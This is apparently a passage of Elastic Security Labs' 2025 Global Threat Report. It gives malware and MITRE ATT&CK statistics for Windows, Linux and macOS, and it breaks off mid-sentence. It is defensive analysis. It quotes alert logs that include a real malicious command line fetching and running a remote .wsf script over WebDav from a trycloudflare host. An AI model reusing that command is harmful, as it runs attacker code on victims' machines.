## 01 Introduction

The adversary’s playbook has fundamentally changed. The era of slow, methodical intrusion has been replaced by a new model of high-velocity attacks that prioritize speed and efficiency. Attackers are now exploiting the trusted tools and workflows of the modern enterprise — cloud accounts, developer platforms, and browsers — making their actions harder than ever to distinguish from normal activity.

The answer is hidden in your data. To spot today’s high-speed attacks, you need an in-depth understanding of your environment. This means using AI-driven analysis to connect real-time events to historical patterns, revealing the full story of an attack. Only with this deep, machine-speed context can you make the quick, confident decisions needed to stop a modern threat.

Our team of researchers, analysts, and engineers at Elastic Security Labs believes that the only way to succeed is through an open, community-based approach — we all get stronger when we share what we learn. This report puts that belief into practice, sharing insights from our global visibility to help you build a stronger, more confident defense.

## 02 Executive Summary

The age of patient, stealthy attacks is giving way to a new era of high-velocity threats. Our year-over-year analysis reveals a clear strategic shift: Adversaries are retooling for speed, weaponizing AI to generate novel threats at scale, and prioritizing immediate execution over prolonged stealth. This acceleration forces defenders to adapt to an attack lifecycle measured in minutes, not months, where rapid, context-rich decisions drawn from both real-time and historical data have become the key to effective defense.

The 2025 Elastic Global Threat Report from Elastic Security Labs breaks down this new landscape. Based on our analysis of global threat telemetry, we’ve identified the key adversary behaviors and defensive innovations that matter most. Here’s a preview of what you’ll learn:

*   **Adversary priorities on Windows have flipped in the last year.** The tactic category of Execution now accounts for 32.05% of malicious behavior — doubling its previous share of ~16% — and surpassing Defense Evasion as the top tactic. This disrupts a three-year trend and indicates a strategic shift toward immediate payload deployment over initial stealth.
    What this means for you –> Attackers are no longer waiting to hide; they are focused on running malicious code immediately upon entry. This makes runtime memory protection and initial access prevention more critical than ever.

*   **The cloud attack surface is highly concentrated.** Over 60% of all cloud security events boil down to just three adversary goals: Initial Access, Persistence, and Credential Access.
    What this means for you –> Across all major cloud platforms, this laser focus on identity-based attacks is a clear signal that hardening authentication flows and monitoring for anomalous privileged access are the most effective ways to defend your cloud workloads.

*   **Adversaries are weaponizing AI to lower the barrier to entry for cybercrime.** We saw a 15.5% increase in Generic threats, a trend likely fueled by adversaries using large language models (LLMs) to quickly generate simple but effective malicious loaders and tools.
    What this means for you –> The rise of AI-generated threats dramatically increases the volume and variety of malware you face. This means relying less on static signatures and more on behavioral analytics and AI-driven detection to automatically identify and stop the flood of novel threats at scale.

*   **The theft of browser credentials has industrialized.** Our analysis of over 150,000 malware samples revealed that more than 1 in 8 are designed to steal browser data. This isn’t for isolated use; these credentials are the raw material fueling the access broker economy, providing a steady supply of keys for other attackers to compromise corporate cloud accounts.
    What this means for you –> The browser is a primary battleground for your organization’s most sensitive data. Infostealers have adapted to built-in browser protections, which means traditional identity controls are no longer enough.

*   **Source code leaks create uniquely permanent risks.** As our internal investigations show, a single accidental commit to GitHub — from API keys to a passport photo — becomes part of a distributed, immutable history that is incredibly difficult to fully remediate, creating durable exposure from a momentary lapse.
    What this means for you –> Continuous monitoring must extend beyond traditional perimeters and into your developer workflows to secure the entire supply chain ecosystem.

These trends are deeply interconnected. An adversary can use AI-generated malware to steal browser credentials, which are then used to gain initial access to a cloud account. Once inside, they immediately focus on execution to deploy ransomware or steal data. This report connects the dots, showing how these TTPs form the modern attack chain and, more importantly, how to break it at multiple points.

The threat landscape is complex, but by understanding malware and threat behaviors and leveraging advanced defenses, organizations can significantly improve their resilience. Elastic Security provides the necessary capabilities and shared intelligence to navigate these challenges and build a more secure digital future through collective efforts and continuous adaptation.

### What’s new in this report

*   **Broader visibility into customer distribution**: For the first time in this report, Elastic is providing the following summary of our enterprise customer distribution to help contextualize trends and correlations. This graphic depicts the 10 most prevalent categories of enterprise, which includes a wide range of service-based businesses, financial services providers, utilities, and public sector organizations. Industry context matters because threat actors don’t target every vertical the same way, and it is important to see risk through the lens of your, and adjacent, industry sectors. Tying threats to vertical realities helps provide a clear view of business impact.

    ![Enterprise customer distribution by category](https://i.imgur.com/example.png)
    *Image description: A bar chart showing the distribution of enterprise customers across various categories, with Technology Consulting Services being the largest at 27.3%.*

*   **Comparison with hybrid sources**: New this year, we provide subsections throughout the Trends and correlations section that describe our observations from hybrid public/private sources: Each vendor collects unique telemetry in the sense that our user and customer populations may not overlap across regions or industries. This comparison to hybrid sources serves as a transparent way to communicate that our visibility may not equate to the broader global threat landscape. It’s a way of showing you that we understand the limits of our imperfect visibility, while also highlighting globally prevalent threats you might have encountered.

*   **Insight into Elastic security machine learning and AI**: With this edition, we’re also including information on Elastic Security Machine Learning and AI, including model performance and updates. These technologies play a pivotal role in defense-in-depth, often mitigating threats before they have an opportunity to impact enterprises.

*   **Visibility into Elastic’s internal threat data**: As Elastic Security’s customer zero, Elastic’s internal information security team provides valuable perspectives about the threats we encounter from the global threat landscape. The case studies they contribute to this publication highlight that we have skin in the game, and we practice what we preach.

*   **Sunset sections from previous reports**: Finally, this edition of Elastic’s Global Threat Report omits some sections from prior editions (such as forecasts and forecast rebuttals) and focuses on key statistics derived from the telemetry data our users and customers opt to share with us. It also provides insights into the work we’re doing both to generate telemetry and prioritize new data or capabilities. Earlier in 2025, we released a companion report, The State of Detection Engineering at Elastic, which tells this story in much more detail. Let’s see how we’re changing together.

## 03 Trends and Correlations

The following subsections describe the major tools, tactics, and procedures (TTPs) employed by threats that were identified across Elastic telemetry from June 2024 to July 2025. Elastic telemetry includes data generated by Elastic Endgame, Elastic Endpoint, and the Elastic Security solution.¹ In some cases, the Elastic Security solution ingested data from third-party sensors and other technologies.

### Malware signature key statistics

In this section, Elastic Security Labs studies the distribution and trends of malware families in 2025 across all our customers’ platforms, comparing these findings with last year’s results where applicable. This study includes all file and memory threats identified using our YARA rules, which are a set of strings or byte signatures that uniquely identify a specific threat or family. In line with our open source philosophy, we continue to share these rules on Elastic’s Protections artifacts repository.

#### Distribution of malware by operating systems in Elastic telemetry

This section generalizes the malware signature events observed across supported operating systems, which presently includes Windows, Linux, and macOS endpoints.

![Distribution of malware by operating system](https://i.imgur.com/example.png)
*Image description: A pie chart showing the distribution of malware by operating system: Windows 89.97%, Linux 9.00%, macOS 1.03%.*

¹ The Elastic Security solution telemetry is generated by a diverse population of sensors and data sources that are too numerous to describe concisely, including sensors not developed by Elastic.

#### Windows summary

Out of all signature-related detections, 89.97% were recorded on Windows. This prevalence is largely due to the distribution of Windows among customer environments and an emphasis on Windows-based research to combat novel and widespread malware threats.

The 23.85% increase in detections compared to last year can be attributed to the increase in Elastic Defend Windows-based adoption.

#### Linux summary

In this year’s study, Linux systems accounted for 9% of observed systems, a notable decrease from the previous year. However, this does not suggest that Linux is less of a target. Given its primary use in server and application hosting, intrusions often involve advanced techniques like exploit kits and custom rootkits, as Elastic Security Labs detailed in its PUMAKIT research earlier this year. Such novel techniques are challenging to detect with YARA signatures, but they may be successfully identified by our agent using behavioral and machine learning–based methods.

#### macOS summary

macOS represents the smallest portion of our data at 1.03%, consistent with the previous year. While this percentage is low, attributed to both its lower adoption among our customers and generally lower volume of malware targeting the platform, it does not imply that macOS is inherently more secure.

Elastic Security’s high level of coverage on this platform allowed us to uncover an advanced threat attack earlier this year, which we attribute to the Democratic People’s Republic of Korea (DPRK).

#### Malware categories observed across all supported operating systems

Each file and memory signature we identify is categorized into distinct but subjectively defined groups. The distribution across these categories is outlined in the following table.

![Malware categories distribution](https://i.imgur.com/example.png)
*Image description: A bar chart showing the distribution of malware categories: Trojan 64.49%, Generic 23.53%, Rootkit 5.01%, Cryptominer 2.77%, RemoteAdmin 1.91%, Other 2.29%.*

##### Trojan category

In this year’s report, Trojans comprised 64.49% of all identified malware. These threats typically masquerade as legitimate software, allowing malicious actors to establish a foothold on compromised systems, exfiltrate sensitive data, deploy additional harmful payloads, and further penetrate network defenses.

Elastic Security Labs maintains vigilance against such threats, documenting a ClickFix malware campaign that was actively employed to deliver these Trojan payloads earlier in the year.

##### Generic category

Generic threats, encompassing various small tools that couldn’t be categorized elsewhere, account for 23.53% of all threats; this category saw a 15.5% increase from last year.

This rise is possibly driven by the ease of creating such tools. Large language models (LLMs) enable even less-skilled adversaries to quickly generate reliable, simple loaders. Additionally, a climate of economic uncertainty often spurs an increase in cybercrime, leading to more diverse and widespread threat activity.

##### Rootkit category

Rootkits have shown a significant increase, reaching 5.01% in this year’s study. Our ability to detect them has greatly improved, particularly on Linux, where many advanced threats leverage kernel-level features for stealth and privileged functionality to establish a deep foothold on infected machines. We conducted an in-depth analysis of a Windows rootkit and its capabilities we refer to as ABYSSWORKER, also known as POORTRY by Google Cloud Mandiant, which was detected in the wild via our telemetry.

##### Cryptominer category

Cryptominers continue to pose a threat, accounting for 2.77% of the share. The majority are deployed to mine Monero cryptocurrency, primarily utilizing XMRIG. This prevalence is likely due to Monero’s privacy features. Additionally, unauthorized cryptomining on Linux has led to an increased research emphasis on these families.

##### Remote Monitoring and Management (RMM) category

Remote Monitoring and Management (RMM) tools, such as TeamViewer or UltraVNC, represent 1.91% of observed instances. These legitimate, free, or paid “support” tools are abused by threat actors to gain remote access to a victim’s machine once the victim is tricked into installing them.

#### Malware families broken down by operating system in Elastic telemetry

This section provides the most prevalent malware families identified on each operating system. The designation “malware family” is applied to related code families that share significant design and implementation similarities, but which may be drastically different in terms of packaging or even translated to another development language.

Prior editions of this report combined data from all operating systems, which influenced the reported distribution of these malicious code families. With this more detailed reporting, we hope to better represent these distributions. For each operating system, we highlight threat phenomena that might otherwise be overlooked and which are reflected in endpoint behavioral trends.

##### Windows-based malware families

Elastic telemetry captured a wide variety of signature events with few, if any, truly dominant code families. However, three general phenomena stand out: the explosion of infostealers, reliable off-the-shelf families, and malware from open sources.

![Windows-based malware families distribution](https://i.imgur.com/example.png)
*Image description: A bar chart showing the distribution of Windows-based malware families, with Windows.Trojan.GhostPulse at 12.2% and Windows.Trojan.Remcos at 9.33%.*

*   **Infostealers and the prevalence of access broker networks**: GhostPulse represents about 12% of signature events and leverages built-in Windows scripting interfaces and process injection to deliver infostealers such as Lumma (6.67%) and Redline (6.67%). Infostealers play a key role in collecting credentials that are packaged and sold by access brokers, which commoditizes initial access while frustrating attribution of initial access attempts.

*   **Off-the-shelf frameworks**: RemCos (9.33%) and CobaltStrike (~2%) were two of the most-frequently identified off-the-shelf malware families seen targeting the Windows operating system. These capabilities benefit from mature development teams and have been leveraged broadly by threats of all kinds to achieve a variety of objectives. While we have observed an overall reduction of off-the-shelf implants this year, we attribute that to the rapid popularity of other code families.

*   **Open sources**: Ayncrat, Havoc, and njRat collectively represent about 13% of signature events. What separates these code families from those developed privately is that these are available publicly on GitHub. The availability of source code lowers the barrier to entry for some threat groups and may inspire features in closed malware development ecosystems. Importantly, this also plays a powerful role in enabling defenders to produce countermeasures from those very same open sources.

##### Linux-based malware families

Linux telemetry shows a consistent threat landscape dominated by commoditized malware, cryptocurrency miners, and lightweight command-and-control (C2) frameworks. Adversaries continue to rely on well-known code families such as Sliver, Mythic, and Metasploit, often deployed after initial access via remote services or public-facing applications. These frameworks are typically used directly from the shell, indicating a hands-on intrusion style.

![Linux-based malware families distribution](https://i.imgur.com/example.png)
*Image description: A bar chart showing the distribution of Linux-based malware families, with Linux.Trojan.Generic at 16.77% and Multi.Trojan.Sliver at 12.43%.*

*   **Persistent patterns**: A common attack methodology observed alongside signature event data begins with Initial Access, followed by rapid establishment of Persistence. Scheduled job mechanisms such as cron and systemd were most commonly abused, frequently triggering behavioral detections. Shell profile modification, XDG autostart desktop entries, and udev rules were also observed. Elastic Security Labs researcher Ruben Groenewoud has shared in-depth research into Linux persistence.

*   **Off-the-shelf, on the wire**: If the cloud is “someone else’s computer”, off-the-shelf capabilities are “someone else’s malware.” Threats of many kinds chose mature and well-built frameworks like Sliver (12.43%), Mythic (~12%), and Metasploit (9.39%) because they reduce the development burden while complicating attribution.

*   **Cryptocurrency mining**: Once persistence is established on Linux, adversaries commonly deploy cryptominers, particularly XMRIG variants. These payloads are usually part of broader scripts that enumerate kernel features, remove competitors using kill commands, harden attacker files via chattr +i, and attempt to evade detection by disabling system logging, firewall rules, and other defenses. Attackers frequently reach out to external services to determine the host’s public IP and often utilize BusyBox for compact utility execution. This common attack pattern is also observed in the overall behavioral telemetry.

##### macOS-based malware families

![macOS-based malware families distribution](https://i.imgur.com/example.png)
*Image description: A bar chart showing the distribution of macOS-based malware families, with MacOS.Trojan.Metasploit at 25.66% and MacOS.Cryptominer.Generic at 17.70%.*

*   **Off-the-shelf malware**: Although the low number of macOS observations makes the study of malware distribution on the platform inherently skewed, we observe that the most widespread family is Metasploit, with 25.66% of the share.

*   **Cryptominers**: Generically identified crypto miners (17.70%) and the well-known XMRig miner (4.42%) collectively represent about 22% of the malware we observed on macOS. Like Linux, macOS appears to be an attractive target for cryptocurrency mining.

*   **Infosealers**: Infostealers are a dominant category on all supported operating systems, with MdQueryTCC (13.27%) and Wallets (7.08%) making up about 20% of total macOS observations. Notably, this doesn’t capture indirect or script-based infostealers — both of which played roles in novel discoveries, which are by definition minority events.

### Endpoint behavior key statistics

Elastic Security operates on the principles of openness, transparency, and collaboration. In line with these values, Elastic shares all protections artifacts used in production, which detail the endpoint behavioral logic developed to identify adversary tradecraft using Elastic. This report leverages global telemetry from the alerts and integrated prevention capabilities derived from this detection logic. To the extent that tactics and techniques exist in MITRE ATT&CK, Elastic Security describes threat behaviors aligned to industry consensus. Readers should note that while tactics represent adversary goals, techniques best describe how adversaries attempted to achieve them. For those comfortable with the notion of even more specific sub-techniques, we think of those as explicit implementations of a technique. Due to sparse data, macOS behaviors have been omitted.

#### Top MITRE ATT&CK tactics

##### Windows operating systems

Execution (32.05%) is the most prevalent tactic, followed by Defense Evasion (23.08%) and Initial Access (19.23%). These three account for nearly 75% of observed activity, indicating attackers are heavily focused on gaining a foothold, evading detection, and running malicious code. Readers familiar with past editions of this report may recall that last year Defense Evasion led this group at about 38% where Execution was about 16%; we attribute these changes to investments in Elastic Defend capabilities and a robust focus on detection engineering, and not changes in threat preferences or motivations. Other tactics like Command and Control (10.26%) and Credential Access/Discovery (~3–4% each) appear less frequently, suggesting they are secondary priorities in many campaigns.

![MITRE ATT&CK tactics distribution for Windows](https://i.imgur.com/example.png)
*Image description: A bar chart showing the distribution of MITRE ATT&CK tactics for Windows: Execution 32.05%, Defense Evasion 23.08%, Initial Access 19.23%, Command and Control 10.26%, Discovery 3.85%, Credential Access 3.85%, Privilege Escalation 2.56%, Persistence 2.56%, Lateral Movement 2.56%.*

##### Linux operating systems

Execution typically maps to shell or interpreter usage. Persistence aligns with abuse of scheduled jobs or malicious systemd units. Defense evasion includes masquerading, disabling security services, clearing logs, and LD_PRELOAD abuse. Discovery phases often involve system and user enumeration. Credential access sometimes occurs via /proc filesystem scraping or leveraging utilities such as unshadow. In terms of command and control, attackers favor both encrypted C2 channels and legitimate services like Telegram. Resource hijacking, especially through crypto mining, remains a dominant impact tactic.

Most rootkits detected via telemetry fall into two categories. The first are shared object rootkits that modify the LD_PRELOAD configuration files. The second are loadable kernel module (LKM) rootkits. These rootkits focus on hiding processes, files, and network artifacts while providing attackers with stealthy persistence. Typical giveaways of these rootkits are out-of-tree/unsigned LKM loading and clearing of the kernel message buffer. Through Elastic’s Auditd Manager integration with well-tailored Auditd detection logic, these threats can be identified upon load.

The telemetry also confirms previously reported findings in Elastic’s research, such as the use of Gsocket in real-world attacks and Telegram abuse by botnet-linked threats. Additionally, our observations echo attribution claims in third-party research such as Solar 4Rays’ report on Shedding Zmiy, which linked PUMAKIT to a broader cluster of APT tooling involving in-memory execution and kernel tampering.

![MITRE ATT&CK tactics distribution for Linux](https://i.imgur.com/example.png)
*Image description: A bar chart showing the distribution of MITRE ATT&CK tactics for Linux: Execution 28.45%, Defense Evasion 24.66%, Discovery 13.48%, Persistence 12.44%, Command and Control 10.36%, Privilege Escalation 9.87%, Impact 0.36%, Exfiltration 0.26%.*

The Linux threat ecosystem in 2025 remains consistent in threat behavior. Most attacks follow a straightforward path from access to persistence and mining, often using bash-based scripts packed with LOLBins, simple evasion logic, and basic C2 channels. More sophisticated threats are rare but present, marked by rootkits, encrypted communication channels, and fileless techniques. While static signature detection remains useful, behavioral detections tied to MITRE ATT&CK tactics offer broader visibility across common attacker playbooks, highlighting the importance of layered telemetry and cross-signal analytics.

#### Top MITRE ATT&CK techniques, Windows operating systems

Command and Scripting Interpreter (21.62%) dominates as the top observed technique, reinforcing its central role in post-compromise activity. User Execution (12.61%) and Phishing (11.71%) remain key entry points, showing the continued reliance on social engineering. System Binary Proxy Execution (10.81%) and Process Injection (6.31%) underscore attackers’ focus on stealth and defense evasion.

The presence of diverse low-frequency techniques — such as Masquerading, Windows Management Instrumentation, and Protocol Tunneling — reflects varied tradecraft, with adversaries layering multiple methods to evade detection and maintain persistence.

The most prevalent Command and Scripting Interpreter subtechniques were PowerShell, Windows Command Shell, JavaScript, and Visual Basic. Javascript and Visual Basic have native interpreters in the form of wscript.exe and cscript.exe, as well as a wide range of other utilities like winrm.exe. Many of these can be chained together interchangeably to evade static forms of detection logic.

Top related protection alerts were for the fake CAPTCHA lure and malicious LNK files, followed by the delivery of malicious js/vbs scripts via archives or disguised as browser updates downloaded directly from malicious websites. Another interesting trend in execution is the use of WebDav to host malicious scripts abusing legitimate tunneling web services such as CloudFlare:

```
message
process.command_line
process.parent.command_line

Malicious Behavior
“C:\Windows\System32\cmd.exe” /c start /min wscript C:\WINDOWS\Explorer.EXE //B //Nologo “\\photos-folding-considerations-walked.trycloudflare.com@SSL\DavWWWRoot\at\croj.wsf”
Prevention Alert: Suspicious Windows Command Shell Execution

Malicious Behavior
“C:\Windows\System32\cmd.exe” /c start /min wscript C:\WINDOWS\Explorer.EXE //B //Nologo “\\photos-folding-considerations-walked.trycloudflare.com@SSL\DavWWWRoot\at\croj.wsf”
Prevention Alert: Script Execution from WebDav
```

For the Defense Evasion tactic category, the top three techniques were System Binary Proxy Execution, Process Injection, and Masquerading. Top related protection alerts show that there is an increase in the abuse of malicious Windows installers via msiexec, NTDLL memory unhooking, Process Hollowing, and DLL-SideLoading for evasion.

Credentials from Web Browsers is the top observed sub-technique for Credential Access, and many Infostealers have adapted to Chromium browsers for application-bound protection.

Remote Monitoring and Management (RMM) tools, while legitimate for IT support and administration, are increasingly being abused by malicious actors for unauthorized access, persistence, and lateral movement within networks. We’ve observed malware instances (Remcos, AsyncRAT, and RedLine) that were deployed using legit RMM tools:

```
message
rule.name
file.name
process.parent.executable
process.parent.code_signature.subject_name

Malware Prevention Alert: Windows.Trojan.Remcos
msvcp1403.dll
C:\Program Files (x86)\ScreenConnect Client (dced0c98722de943)\ScreenConnect.WindowsClient.exe
Connectwise, LLC

Malware Prevention Alert: Windows.Trojan.Remcos
msvcp1403.dll
C:\Program Files (x86)\ScreenConnect Client (dced0c98722de943)\ScreenConnect.WindowsClient.exe
Connectwise, LLC

Malware Prevention Alert: Windows.Trojan.Remcos
msvcp1403.dll
C:\Program Files (x86)\ScreenConnect Client (dced0c98722de943)\ScreenConnect.WindowsClient.exe
Connectwise, LLC
```

Here is an example of a shellcode alert where the legitimate Netsupport Manager was abused to drop a malicious DLL wpdecodejp.dll side-loaded by a signed benign binary:

```
message
event.code
process.parent.name
process.parent.code_signature.subject_name
process.executable
process.code_signature.subject_name
process.thread.Ext.user_module.path

Memory Threat Detection Alert: Windows.Generic.shellcode thread
client32.exe
NetSupport Software LTD
Babylon.exe
Babylon
c:\users\public\music\wpdecodejp.dll

Memory Threat Detection Alert: Windows.Generic.shellcode thread
client32.exe
NetSupport Software LTD
Babylon.exe
Babylon
c:\users\public\music\wpdecodejp.dll
```

NetSupport Manager can be used as a primary or follow-on payload. This detection NetSupport Execution form unusual Path was quite effective at identifying its abuse.

#### Top MITRE ATT&CK techniques, Linux operating systems

Adversaries favor living-off-the-land (LOTL) techniques for execution, commonly establishing reverse shells and C2 via preinstalled tools such as bash, socat, netcat, curl, and wget. Interpreters like Python, Perl, Ruby, and PHP are frequently used for payload delivery, with Lua appearing in niche cases. OpenSSL is also observed for encrypted C2, though its dual-use nature makes detection more challenging. These patterns reflect a consistent reliance on low-footprint, native tooling.

Defense evasion remains a key priority for Linux-based attackers. Process name masquerading is widespread, with frequent cases of malicious processes renaming themselves to mimic kernel threads such as kworker or kthreadd, or common daemons such as sshd or crond. This behavior is notably observed in adversaries using Gsocket, which provides encrypted C2 communications and is repeatedly detected both through signature and behavioral means. Additionally, timestomping via the touch binary is a frequently observed evasion technique. Name-stomping is also common in cryptominers and downloaders. Telegram is another increasingly favored C2 medium, especially among threats like Kaiji and Rudedevil, as observed in previous Elastic research.

A typical example of this attack chain was laid out in our recent research on Outlaw, displayed below.

![Outlaw attack chain diagram](https://i.imgur.com/example.png)
*Image description: A diagram illustrating the Outlaw attack chain, starting with "Kill Other Miners" and "Modiﬁed XMRig," leading to "Mining Pool" and "ELF" components, and eventually "Infect node & continue."*

More advanced cases reveal occasional use of in-memory execution. While low in volume, this technique has been observed in PUMAKIT and other malware, suggesting continued adversary interest in stealthy, fileless payload delivery. PUMAKIT’s attack flow is illustrated below.

![PUMAKIT attack flow diagram](https://i.imgur.com/example.png)
*Image description: A diagram illustrating the PUMAKIT attack flow, showing conditional checks, LD_PRELOAD, and the loading of LKM and userland rootkits.*

### Visibility derived from hybrid sources

Elastic Security Labs additionally considered the distribution of events from internal detonation frameworks, which pull malware samples from both public and private sources. The following is meant to compare and contrast Elastic telemetry observations to the threat landscape, based on our conclusion that the Elastic user does not experience phenomena non-locally.

#### Malware families observed by volume

![Malware families observed by volume](https://i.imgur.com/example.png)
*Image description: A bar chart showing the volume of observed malware families, with Windows.Trojan.SnakeKeylogger at 17.49% and Windows.Trojan.AgentTesla at 12.79%.*

![Malware family counts](https://i.imgur.com/example.png)
*Image description: A table listing various Windows Trojan malware families and their unique agent.id counts.*

#### Major file types

Top file types for top malware (from the above table): Outside of EXE, clearly MSI is dominating, followed by ISO, ZIP/RAR, and JS/VBS, LNK is also still relevant as its often embedded in ZIP/RAR:

![Major file types distribution](https://i.imgur.com/example.png)
*Image description: A pie chart showing the distribution of major file types: exe 68.11%, msi 10.54%, iso 9.47%, zip 3.16%, dll 1.5%, js 1.46%, rar 1.16%, vbs 1.11%, hta 0.99%, doc 1.09%, lnk 0.7%.*

#### Top behavior rules (at least 1,000 unique sample hashes)

![Top behavior rules](https://i.imgur.com/example.png)
*Image description: A list of